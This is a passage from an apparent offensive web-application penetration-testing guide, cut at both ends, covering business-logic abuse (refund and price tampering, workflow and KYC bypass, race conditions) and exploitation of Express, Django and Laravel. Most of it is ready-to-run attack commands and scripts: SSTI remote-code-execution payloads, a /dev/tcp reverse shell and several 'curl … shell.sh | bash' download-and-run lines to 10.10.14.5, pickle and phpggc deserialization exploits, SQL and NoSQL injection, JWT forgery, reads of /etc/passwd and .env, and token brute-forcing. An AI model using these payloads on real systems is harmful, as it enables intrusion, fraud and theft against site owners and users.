  -d '{"transaction_id":"real_txn_123","status":"success","order_id":"789"}'
```

**Refund Process Manipulation**

```bash
# Request refund with inflated amount
curl -X POST https://target.com/api/refund \
  -H "Content-Type: application/json" \
  -d '{"order_id":123,"amount":999.99,"reason":"defective"}'

# Multiple refund requests for same order
for i in {1..5}; do
  curl -X POST https://target.com/api/refund \
    -H "Content-Type: application/json" \
    -d '{"order_id":123,"amount":99.99}'
done

# Request refund before payment clears
curl -X POST https://target.com/api/refund \
  -H "Content-Type: application/json" \
  -d '{"order_id":123,"status":"pending"}'

# Partial refund exploitation
curl -X POST https://target.com/api/refund \
  -H "Content-Type: application/json" \
  -d '{"order_id":123,"items":[1,1,1,1,1]}'  # Same item multiple times
```

### Pricing Manipulation

**Client-Side Price Trust**

```bash
# Modify hidden form fields
# Original HTML: <input type="hidden" name="price" value="99.99">
curl -X POST https://target.com/checkout \
  -d "item_id=123&price=0.01&quantity=1"

# Tamper with JavaScript-calculated prices
# Intercept request before submission and modify total
curl -X POST https://target.com/api/order \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":123,"price":0.01}],"total":0.01}'

# Test if server recalculates or trusts client
curl -X POST https://target.com/api/order \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":123,"price":99.99},{"id":456,"price":49.99}],"total":1.00}'
```

**Parameter Pollution in Pricing**

```bash
# Send multiple price parameters
curl -X POST https://target.com/checkout \
  -d "item_id=123&price=99.99&price=0.01"

curl "https://target.com/checkout?item_id=123&price=99.99&price=0.01"

# Array-based parameter pollution
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"price":[99.99,0.01]}'

# Test which value is processed (first, last, lowest)
curl -X POST https://target.com/checkout \
  -d "item_id=123&price=0.01&price=99.99"
```

**Pricing Logic Edge Cases**

```bash
# Test floating point precision issues
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":3,"price":0.333333333333}'

# Test rounding errors
# If total = quantity * price, test if rounding happens correctly
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"items":[
    {"id":1,"price":0.01,"quantity":999},
    {"id":2,"price":0.01,"quantity":999},
    {"id":3,"price":0.01,"quantity":999}
  ]}'

# Scientific notation
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"price":1e-10}'

# Extremely small values
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"price":0.00000001}'
```

**Bundle/Package Manipulation**

```bash
# If bundle pricing exists, test individual item addition
# Bundle: 3 items for $50
# Test: Add items individually, apply bundle discount manually

curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1}'

curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":2,"quantity":1}'

curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":3,"quantity":1}'

curl -X POST https://target.com/api/cart/discount \
  -H "Content-Type: application/json" \
  -d '{"discount_type":"bundle","bundle_id":999}'

# Remove one item from bundle after discount applied
curl -X DELETE https://target.com/api/cart/item/1

# Add bundle, then modify quantities
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"bundle_id":123}'

curl -X PUT https://target.com/api/cart/item/1 \
  -H "Content-Type: application/json" \
  -d '{"quantity":10}'
```

### Workflow Manipulation

Workflow manipulation targets the expected sequence of operations in business processes.

**Step Sequence Bypass**

```bash
# Normal workflow: step1 -> step2 -> step3 -> complete
# Test direct access to completion

# Skip directly to final step
curl -X POST https://target.com/api/process/complete \
  -H "Content-Type: application/json" \
  -d '{"process_id":123}'

# Reverse order execution
curl -X POST https://target.com/api/process/step3 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

curl -X POST https://target.com/api/process/step2 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

curl -X POST https://target.com/api/process/step1 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

# Skip middle steps
curl -X POST https://target.com/api/process/step1 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

curl -X POST https://target.com/api/process/step3 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

# Repeat steps
curl -X POST https://target.com/api/process/step2 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'

curl -X POST https://target.com/api/process/step2 \
  -H "Content-Type: application/json" \
  -d '{"data":"test"}'
```

**State Manipulation**

```bash
# Force state transition without meeting requirements
curl -X PUT https://target.com/api/order/123 \
  -H "Content-Type: application/json" \
  -d '{"status":"completed"}'

curl -X PUT https://target.com/api/order/123 \
  -H "Content-Type: application/json" \
  -d '{"status":"shipped","payment_status":"paid"}'

# Revert to previous state
curl -X PUT https://target.com/api/order/123 \
  -H "Content-Type: application/json" \
  -d '{"status":"pending"}'

# Invalid state transitions
curl -X PUT https://target.com/api/order/123 \
  -H "Content-Type: application/json" \
  -d '{"status":"cancelled","previous_status":"completed"}'

# Multiple simultaneous states
curl -X PUT https://target.com/api/order/123 \
  -H "Content-Type: application/json" \
  -d '{"status":["pending","completed","shipped"]}'
```

**Approval Process Bypass**

```bash
# Submit for approval and immediately approve
curl -X POST https://target.com/api/request/submit \
  -H "Content-Type: application/json" \
  -d '{"request_id":123,"type":"withdrawal","amount":10000}'

curl -X POST https://target.com/api/request/approve \
  -H "Content-Type: application/json" \
  -d '{"request_id":123}'

# Approve own request
curl -X POST https://target.com/api/request/123/approve \
  -H "Authorization: Bearer <REQUESTER_TOKEN>"

# Manipulate approval count
curl -X POST https://target.com/api/request/123 \
  -H "Content-Type: application/json" \
  -d '{"approvals_count":2,"approvals_required":2}'

# Test role escalation in approval
curl -X POST https://target.com/api/request/approve \
  -H "Content-Type: application/json" \
  -d '{"request_id":123,"approver_role":"admin","approver_id":999}'
```

**Time-Based Workflow Manipulation**

```bash
# Manipulate timestamps to bypass time restrictions
curl -X POST https://target.com/api/event/register \
  -H "Content-Type: application/json" \
  -d '{"event_id":123,"registration_time":"2025-01-01T00:00:00Z"}'

# Backdated actions
curl -X POST https://target.com/api/transaction \
  -H "Content-Type: application/json" \
  -d '{"amount":1000,"date":"2024-12-31T23:59:59Z"}'

# Future-dated actions
curl -X POST https://target.com/api/schedule \
  -H "Content-Type: application/json" \
  -d '{"action":"process","execute_at":"2099-12-31T23:59:59Z"}'

# Timezone manipulation
curl -X POST https://target.com/api/booking \
  -H "Content-Type: application/json" \
  -d '{"slot":"2025-10-12T10:00:00+14:00"}'  # UTC+14 (earliest timezone)

curl -X POST https://target.com/api/booking \
  -H "Content-Type: application/json" \
  -d '{"slot":"2025-10-12T10:00:00-12:00"}'  # UTC-12 (latest timezone)
```

### Multi-Step Process Bypass

**Registration/Verification Bypass**

```bash
# Normal flow: register -> verify email -> activate account
# Test: skip verification

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"pass123"}'

# Directly activate without verification
curl -X POST https://target.com/api/account/activate \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# Use account before verification
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"pass123"}'

# Manipulate verification token
curl -X GET "https://target.com/api/verify?token=predictable_token_001"

# Test sequential tokens
for i in {1..100}; do
  curl -X GET "https://target.com/api/verify?token=$i"
done

# Reuse verification token
curl -X GET "https://target.com/api/verify?token=valid_token_abc123"
curl -X GET "https://target.com/api/verify?token=valid_token_abc123&email=different@test.com"
```

**KYC/Identity Verification Bypass**

```bash
# Submit without required documents
curl -X POST https://target.com/api/kyc/submit \
  -H "Content-Type: application/json" \
  -d '{"user_id":123,"status":"verified"}'

# Manipulate verification level
curl -X PUT https://target.com/api/user/123 \
  -H "Content-Type: application/json" \
  -d '{"kyc_level":3,"verified":true}'

# Reuse someone else's verification
curl -X POST https://target.com/api/kyc/submit \
  -H "Content-Type: application/json" \
  -d '{"verification_id":"someone_else_verification_id"}'

# Skip to verified state
curl -X POST https://target.com/api/user/status \
  -H "Content-Type: application/json" \
  -d '{"kyc_status":"approved","verified_at":"2025-10-12T00:00:00Z"}'
```

**Survey/Form Multi-Page Bypass**

```bash
# Normal: page1 -> page2 -> page3 -> submit
# Test: submit directly with all data

curl -X POST https://target.com/api/survey/submit \
  -H "Content-Type: application/json" \
  -d '{"page1":{"q1":"answer"},"page2":{"q2":"answer"},"page3":{"q3":"answer"}}'

# Submit partial data
curl -X POST https://target.com/api/survey/submit \
  -H "Content-Type: application/json" \
  -d '{"page1":{"q1":"answer"}}'

# Skip validation by manipulating page number
curl -X POST https://target.com/api/survey/page \
  -H "Content-Type: application/json" \
  -d '{"current_page":999,"data":{"final":"answer"}}'
```

### Race Condition in Critical Operations

Race conditions occur when multiple operations compete, potentially causing inconsistent states.

**Financial Transaction Race Conditions**

```bash
# Withdraw same amount simultaneously (insufficient funds check bypass)
# Account balance: $100
# Attempt: Two withdrawals of $80 each

# Terminal 1 and 2 simultaneously:
curl -X POST https://target.com/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"amount":80}' &
curl -X POST https://target.com/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"amount":80}' &
wait

# Using GNU parallel for precise timing
parallel -j 2 curl -X POST https://target.com/api/withdraw \
  -H "Content-Type: application/json" \
  -d '{"amount":80}' ::: 1 2

# Python script for race condition exploitation
python3 << 'EOF'
import requests
import threading

def withdraw():
    response = requests.post('https://target.com/api/withdraw',
        json={'amount': 80},
        headers={'Authorization': 'Bearer TOKEN'})
    print(response.status_code, response.text)

threads = []
for i in range(10):
    t = threading.Thread(target=withdraw)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
EOF
```

**Coupon/Voucher Race Conditions**

```bash
# Single-use coupon applied multiple times
# Launch simultaneous requests

for i in {1..20}; do
  curl -X POST https://target.com/api/apply-coupon \
    -H "Content-Type: application/json" \
    -d '{"coupon_code":"SINGLE_USE_CODE"}' &
done
wait

# Limited quantity item race condition
# 1 item left, 10 people try to buy

parallel -j 10 curl -X POST https://target.com/api/purchase \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1}' ::: {1..10}

# Reward points redemption race
python3 << 'EOF'
import requests
import threading

def redeem_points():
    response = requests.post('https://target.com/api/redeem',
        json={'points': 1000, 'reward_id': 456},
        headers={'Authorization': 'Bearer TOKEN'})
    print(response.json())

# User has 1000 points, tries to redeem multiple times
threads = [threading.Thread(target=redeem_points) for _ in range(5)]
for t in threads:
    t.start()
for t in threads:
    t.join()
EOF
```

**Inventory/Stock Management Race Conditions**

```bash
# Last item purchase race
# Stock: 1 unit
# Attempt: Multiple purchases

seq 1 20 | parallel -j 20 curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"user_id":{}}'

# Reservation system race condition
# Single appointment slot, multiple bookings

python3 << 'EOF'
import requests
import threading
from datetime import datetime

def book_slot():
    data = {
        'slot_id': 789,
        'date': '2025-10-15',
        'time': '14:00'
    }
    response = requests.post('https://target.com/api/book',
        json=data,
        headers={'Authorization': 'Bearer TOKEN'})
    print(f"Thread {threading.current_thread().name}: {response.status_code}")

threads = [threading.Thread(target=book_slot) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()
EOF
```

**Voting/Like/Rating Race Conditions**

```bash
# Multiple votes from same user
for i in {1..50}; do
  curl -X POST https://target.com/api/vote \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"post_id":123,"vote":1}' &
done
wait

# Contest entry race condition
# Limit: 1 entry per user
# Exploit: Submit multiple entries simultaneously

parallel -j 15 curl -X POST https://target.com/api/contest/enter \
  -H "Authorization: Bearer TOKEN" \
  -d "entry_data=test" ::: {1..15}
```

**Account Creation/Username Race Condition**

```bash
# Claim same username with multiple accounts

python3 << 'EOF'
import requests
import threading

username = "desirable_username"

def register_account(email):
    data = {
        'username': username,
        'email': email,
        'password': 'password123'
    }
    response = requests.post('https://target.com/api/register', json=data)
    print(f"{email}: {response.status_code} - {response.text}")

emails = [f'user{i}@test.com' for i in range(10)]
threads = [threading.Thread(target=register_account, args=(email,)) for email in emails]

for t in threads:
    t.start()
for t in threads:
    t.join()
EOF
```

**Database Lock Exploitation**

```bash
# Exploit time window during transaction processing
# Transaction: Check balance -> Deduct amount -> Update balance

# Launch requests during processing window
python3 << 'EOF'
import requests
import threading
import time

def transfer():
    # Trigger slow transaction
    response = requests.post('https://target.com/api/transfer',
        json={'to_account': 999, 'amount': 50},
        headers={'Authorization': 'Bearer TOKEN'},
        timeout=10)
    print(f"Transfer: {response.status_code}")

def withdraw():
    # Attempt withdrawal during transfer processing
    time.sleep(0.1)  # Small delay to hit processing window
    response = requests.post('https://target.com/api/withdraw',
        json={'amount': 50},
        headers={'Authorization': 'Bearer TOKEN'})
    print(f"Withdrawal: {response.status_code}")

t1 = threading.Thread(target=transfer)
t2 = threading.Thread(target=withdraw)

t1.start()
t2.start()
t1.join()
t2.join()
EOF
```

**Time-of-Check to Time-of-Use (TOCTOU)**

```bash
# Exploit time gap between validation and execution

# Step 1: Start process with valid data
curl -X POST https://target.com/api/process/start \
  -H "Content-Type: application/json" \
  -d '{"user_id":123,"action":"transfer","amount":100}' &

# Step 2: Modify data during processing
sleep 0.5
curl -X PUT https://target.com/api/process/123/update \
  -H "Content-Type: application/json" \
  -d '{"amount":10000}'

# Premium feature access TOCTOU
# 1. Start premium trial
curl -X POST https://target.com/api/trial/start \
  -H "Authorization: Bearer TOKEN"

# 2. Immediately cancel subscription
curl -X POST https://target.com/api/subscription/cancel \
  -H "Authorization: Bearer TOKEN"

# 3. Check if premium features still accessible
curl -X GET https://target.com/api/premium/feature \
  -H "Authorization: Bearer TOKEN"
```

---

**Important Testing Notes:**

1. **[Inference]** Race conditions require precise timing - use tools like Turbo Intruder (Burp Suite) or Python threading for better control
2. **Always test in authorized environments** - these techniques can cause data integrity issues
3. **Document all findings carefully** - business logic flaws often require detailed reproduction steps
4. **Monitor application state** - check database/logs to confirm successful exploitation
5. **Test variations** - race conditions may only work under specific load or timing conditions

---

## Web Framework Exploitation

### Express.js Specific Vulnerabilities

Express.js is a minimal Node.js web framework. Common vulnerabilities arise from improper configuration, middleware misuse, and prototype pollution.

**Prototype Pollution:**

Prototype pollution occurs when attackers can inject properties into JavaScript object prototypes, affecting all objects.

1. **Detection techniques**:

```bash
# Test parameter pollution
curl "http://target.com/api/user?__proto__[isAdmin]=true"

# JSON payload testing
curl -X POST http://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# Nested object pollution
curl -X POST http://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"user": {"__proto__": {"role": "admin"}}}'
```

2. **Common vulnerable patterns**:

```javascript
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];  // No prototype check
    }
}

// Vulnerable object assignment
app.post('/update', (req, res) => {
    Object.assign(user, req.body);  // Dangerous if req.body contains __proto__
});
```

3. **Exploitation payloads**:

```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "administrator"
  }
}

{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

**Parameter Pollution:**

Express parses query parameters and can be exploited when applications don't handle arrays properly.

```bash
# Send array instead of single value
curl "http://target.com/api/users?id=1&id=2&id=3"

# HPP (HTTP Parameter Pollution)
curl "http://target.com/search?category=books&category=../../etc/passwd"

# Testing array handling
curl "http://target.com/api/delete?id[]=1&id[]=2"
```

**Template Injection in Express:**

When using template engines like Pug, Handlebars, or EJS without proper sanitization.

1. **Server-Side Template Injection (SSTI) in Pug**:

```bash
# Basic SSTI detection
curl "http://target.com/?name={{7*7}}"
curl "http://target.com/?name=#{7*7}"

# RCE payload for Pug
curl "http://target.com/?name=#{ process.mainModule.require('child_process').execSync('id') }"

# File read
curl "http://target.com/?name=#{ process.mainModule.require('fs').readFileSync('/etc/passwd').toString() }"
```

2. **SSTI in Handlebars**:

```bash
# Detection
curl "http://target.com/?template={{constructor}}"

# RCE payload
curl -X POST http://target.com/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').exec('whoami');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}"}'
```

3. **SSTI in EJS**:

```bash
# Detection
curl "http://target.com/?page=<%= 7*7 %>"

# RCE payload
curl "http://target.com/?page=<%= global.process.mainModule.require('child_process').execSync('id') %>"

# Reverse shell
curl "http://target.com/?page=<%= global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"') %>"
```

**JWT Vulnerabilities in Express:**

1. **None algorithm bypass**:

```python
#!/usr/bin/env python3
import jwt
import base64

# Create token with "none" algorithm
payload = {"username": "admin", "role": "administrator"}
token = jwt.encode(payload, "", algorithm="none")
print(f"Token: {token}")
```

2. **Weak secret brute force**:

```bash
# Using jwt-cracker
npm install -g jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "abcdefghijklmnopqrstuvwxyz" 6

# Using hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

3. **Algorithm confusion (RS256 to HS256)**:

```python
#!/usr/bin/env python3
import jwt

# Extract public key from RS256 token endpoint
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Create token using public key as HMAC secret
payload = {"username": "admin", "role": "administrator"}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged token: {token}")
```

**NoSQL Injection in Express with MongoDB:**

```bash
# Basic NoSQL injection in login
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Bypass with regex
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}'

# Extract data with $where
curl -X POST http://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "this.password.match(/^a/)"}}'

# JavaScript injection in $where
curl -X POST http://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "sleep(5000)"}'
```

**Path Traversal in Express:**

```bash
# Basic path traversal
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/static/....//....//....//etc/passwd"

# URL-encoded
curl "http://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc%252fpasswd"

# Null byte bypass [Inference - older Node.js versions]
curl "http://target.com/download?file=../../../etc/passwd%00.pdf"
```

**Command Injection:**

```bash
# Test in parameters that might execute system commands
curl "http://target.com/ping?host=127.0.0.1;id"
curl "http://target.com/ping?host=127.0.0.1|whoami"
curl "http://target.com/ping?host=127.0.0.1\`id\`"
curl "http://target.com/convert?file=test.jpg;curl+http://10.10.14.5:8000/shell.sh|bash"

# URL-encoded
curl "http://target.com/ping?host=127.0.0.1%3Bid"
curl "http://target.com/ping?host=127.0.0.1%7Cwhoami"
```

**Denial of Service (ReDoS):**

Regular Expression Denial of Service exploits inefficient regex patterns.

```bash
# Test ReDoS in email validation
curl -X POST http://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'

# Test in search functionality
curl "http://target.com/search?q=a{50}b"

# Payload generator
python3 -c "print('a' * 50000 + '!')"
```

**Session Fixation:**

```bash
# Obtain session ID
curl -c cookies.txt http://target.com/

# Extract session ID
SESSION_ID=$(grep connect.sid cookies.txt | awk '{print $7}')

# Send to victim (social engineering required)
echo "http://target.com/?session=$SESSION_ID"

# After victim logs in, use the fixed session
curl -b "connect.sid=$SESSION_ID" http://target.com/admin
```

### Django Specific Vulnerabilities

Django is a Python web framework with built-in security features, but misconfigurations and specific attack vectors remain exploitable.

**Debug Mode Information Disclosure:**

When `DEBUG = True` in production, Django exposes sensitive information.

```bash
# Trigger error page
curl "http://target.com/nonexistent-page"
curl "http://target.com/api/user/abc"  # Invalid ID

# Common error endpoints
curl -X POST http://target.com/form  # Missing CSRF token
curl "http://target.com/%00"  # Null byte
curl "http://target.com/" -H "Host: invalid..host"  # Invalid hostname
```

Information exposed in debug mode:

- Django version
- Python version
- Installed applications
- Middleware configuration
- Database credentials (sometimes)
- Full file paths
- Environment variables
- SQL queries

**SSTI in Django Templates:**

Django templates have limited execution capabilities, but vulnerabilities exist.

1. **Detection**:

```bash
# Basic template syntax
curl "http://target.com/?name={{7*7}}"
curl "http://target.com/?name={{7*'7'}}"

# Django-specific
curl "http://target.com/?name={{request}}"
curl "http://target.com/?name={{settings.SECRET_KEY}}"
```

2. **Information disclosure**:

```bash
# Access settings
curl "http://target.com/?template={{settings.DATABASES}}"
curl "http://target.com/?template={{settings.SECRET_KEY}}"

# Access request object
curl "http://target.com/?template={{request.META}}"
curl "http://target.com/?template={{request.user}}"

# List available objects
curl "http://target.com/?template={{''.__class__.__mro__}}"
```

3. **RCE attempts** [Unverified - depends on template configuration]:

```bash
# Access Python internals
curl "http://target.com/?template={{''.__class__.__mro__[1].__subclasses__()}}"

# Potential RCE payload
curl "http://target.com/?template={{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}"
```

**SQL Injection in Django ORM:**

Django ORM protects against SQL injection, but raw queries and extra() are vulnerable.

1. **Raw queries**:

```bash
# Test for SQL injection
curl "http://target.com/user?id=1' OR '1'='1"
curl "http://target.com/search?q=test' UNION SELECT 1,2,3--"

# Time-based blind SQLi
curl "http://target.com/user?id=1' AND SLEEP(5)--"
curl "http://target.com/user?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
```

2. **extra() method exploitation**:

```python
# Vulnerable code example:
# User.objects.extra(where=["id=%s" % request.GET['id']])

# Exploitation
curl "http://target.com/api/users?id=1 OR 1=1"
```

**Mass Assignment Vulnerability:**

Django ModelForms can be vulnerable if not properly configured with `fields` or `exclude`.

```bash
# Test by adding unexpected fields
curl -X POST http://target.com/profile/update \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "is_staff": true, "is_superuser": true}'

# Try common privilege fields
curl -X POST http://target.com/api/user \
  -d "username=test&password=test&is_admin=true&role=administrator"
```

**CSRF Token Bypass:**

1. **Missing CSRF middleware**:

```bash
# Test without CSRF token
curl -X POST http://target.com/transfer \
  -d "amount=1000&to=attacker"
```

2. **CSRF token leakage**:

```bash
# Check if token exposed in GET requests
curl "http://target.com/form" | grep csrftoken

# Check in error pages
curl "http://target.com/invalid" | grep csrf
```

3. **Token reuse across sessions**:

```bash
# Extract token from one session
TOKEN=$(curl -c cookies1.txt http://target.com/login | grep csrf | cut -d'"' -f6)

# Use in different session
curl -b cookies2.txt -X POST http://target.com/transfer \
  -d "csrfmiddlewaretoken=$TOKEN&amount=1000"
```

**Pickle Deserialization:**

Django's session framework can use pickle serialization, which is dangerous if session data is controllable.

```python
#!/usr/bin/env python3
import pickle
import base64
import os

# Create malicious pickle payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://10.10.14.5:8000/shell.sh | bash',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(f"Payload: {encoded}")
```

```bash
# Inject into session cookie
curl -b "sessionid=$ENCODED_PAYLOAD" http://target.com/
```

**Path Traversal in File Serving:**

```bash
# Static files misconfiguration
curl "http://target.com/static/../../../../etc/passwd"
curl "http://target.com/media/../../../etc/passwd"

# FileResponse path traversal
curl "http://target.com/download?file=../../../../etc/passwd"
curl "http://target.com/download?path=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

**Admin Interface Exploitation:**

1. **Username enumeration**:

```bash
# Check if admin exists
curl -X POST http://target.com/admin/login/ \
  -d "username=admin&password=wrong" | grep "Please enter the correct"

# Brute force usernames
for user in admin administrator root superuser; do
  response=$(curl -s -X POST http://target.com/admin/login/ \
    -d "username=$user&password=wrong")
  echo "$user: $response" | grep -i "please enter"
done
```

2. **Default credentials**:

```bash
# Common Django admin credentials
admin:admin
admin:password
admin:django
administrator:admin
```

3. **Admin panel discovery**:

```bash
# Common paths
curl http://target.com/admin/
curl http://target.com/administrator/
curl http://target.com/django-admin/
curl http://target.com/manage/
```

**ORM Query Performance DoS:**

```bash
# Cause expensive queries
curl "http://target.com/search?q=&limit=999999"
curl "http://target.com/api/users?page=999999"

# Nested relationship exploitation
curl "http://target.com/api/posts?include=author,comments,comments.author,comments.author.posts"
```

**Settings Module Exposure:**

```bash
# Try to access settings
curl "http://target.com/settings.py"
curl "http://target.com/myapp/settings.py"
curl "http://target.com/../settings.py"

# Check for exposed configuration
curl "http://target.com/.env"
curl "http://target.com/config.py"
```

### Laravel Specific Vulnerabilities

Laravel is a PHP framework with built-in security features, but misconfigurations and specific vulnerabilities can be exploited.

**Debug Mode Exploitation:**

Laravel's debug mode (`APP_DEBUG=true`) exposes sensitive information through error pages.

```bash
# Trigger error pages
curl "http://target.com/nonexistent"
curl -X POST http://target.com/api/invalid
curl "http://target.com/" -H "X-Forwarded-Host: evil.com"

# Invalid route method
curl -X PUT http://target.com/  # If only GET/POST allowed

# Malformed JSON
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{invalid json'
```

Information exposed:

- Laravel version
- PHP version
- Database credentials
- APP_KEY (critical for further exploitation)
- Full file paths
- Installed packages
- Environment variables

**APP_KEY Exploitation:**

Laravel's APP_KEY is used for encryption. If obtained, you can forge session cookies and decrypt data.

1. **Obtaining APP_KEY**:

```bash
# From debug page
curl http://target.com/trigger-error | grep APP_KEY

# From exposed .env file
curl http://target.com/.env
curl http://target.com/../.env
curl http://target.com/storage/.env

# From Git exposure
curl http://target.com/.git/config
```

2. **Forging session cookies with phpggc**:

```bash
# Install phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Generate Laravel RCE payload
./phpggc Laravel/RCE1 system id -b

# Generate with specific APP_KEY
./phpggc Laravel/RCE1 system "curl http://10.10.14.5:8000/shell.sh | bash" -b \
  -k "base64:APP_KEY_HERE"

# Use generated cookie
curl -b "laravel_session=GENERATED_COOKIE" http://target.com/
```

3. **Unserialize RCE**:

```bash
# Create payload
./phpggc Laravel/RCE1 system "id" -b -k "APP_KEY"

# Inject in cookie
curl -b "laravel_session=$PAYLOAD" http://target.com/
curl -b "XSRF-TOKEN=$PAYLOAD" http://target.com/
```

**Mass Assignment Vulnerability:**

Laravel models can be vulnerable if `$fillable` or `$guarded` properties aren't properly set.

```bash
# Test privilege escalation
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "attacker", "email": "test@test.com", "is_admin": 1, "role": "admin"}'

# Try common privilege fields
curl -X PATCH http://target.com/api/profile \
  -d "name=test&is_admin=1&role_id=1&user_type=administrator"

# Modify other users
curl -X PUT http://target.com/api/users/1 \
  -d "id=2&password=hacked123"
```

**SQL Injection in Raw Queries:**

Laravel's Eloquent ORM is safe, but raw queries can be vulnerable.

```bash
# Test whereRaw
curl "http://target.com/users?name=admin' OR '1'='1"
curl "http://target.com/search?q=test' UNION SELECT 1,2,3,4,5--+"

# Test DB::raw()
curl "http://target.com/api/products?order=id DESC; DROP TABLE users--"

# Time-based blind SQLi
curl "http://target.com/user?id=1' AND SLEEP(5)--+"
curl "http://target.com/user?id=1'; SELECT IF(1=1, SLEEP(5), 0)--+"

# Boolean-based
curl "http://target.com/user?id=1' AND '1'='1"
curl "http://target.com/user?id=1' AND (SELECT COUNT(*) FROM users)>0--+"
```

**SSTI in Blade Templates:**

Blade templates have limited execution, but vulnerabilities can occur with raw output or custom directives.

1. **Detection**:

```bash
# Test template syntax
curl "http://target.com/?name={{7*7}}"
curl "http://target.com/?name=@php system('id'); @endphp"

# Blade-specific
curl "http://target.com/?name={{phpinfo()}}"
curl "http://target.com/?template={!!system('id')!!}"
```

2. **RCE payloads**:

```bash
# Using @php directive
curl "http://target.com/?template=@php+system('whoami');+@endphp"

# Using {!! !!} (unescaped output)
curl "http://target.com/?content={!!system('id')!!}"
curl "http://target.com/?page={!!exec('cat+/etc/passwd')!!}"

# PHP execution
curl "http://target.com/?name={{eval('system(\"id\");')}}"
```

**Route Model Binding Exploitation:**

```bash
# UUID/GUID enumeration
curl http://target.com/user/00000000-0000-0000-0000-000000000001
curl http://target.com/user/00000000-0000-0000-0000-000000000002

# Integer ID enumeration
for i in {1..100}; do
  curl http://target.com/api/users/$i
done

# IDOR testing
curl http://target.com/invoice/1
curl http://target.com/invoice/2
curl http://target.com/order/99999
```

**Authentication Bypass:**

1. **Remember token exploitation**:

```bash
# Steal remember token from XSS or database
TOKEN="extracted_remember_token"
curl -b "remember_web_TOKEN" http://target.com/dashboard
```

2. **Password reset token prediction** [Inference - if weak randomness]:

```bash
# Generate password reset
curl -X POST http://target.com/password/email \
  -d "email=victim@example.com"

# Brute force token (if predictable)
for token in $(seq 1000 2000); do
  response=$(curl -s -X POST http://target.com/password/reset \
    -d "token=$token&email=victim@example.com&password=hacked123")
  if [[ $response != *"invalid"* ]]; then
    echo "[+] Valid token: $token"
    break
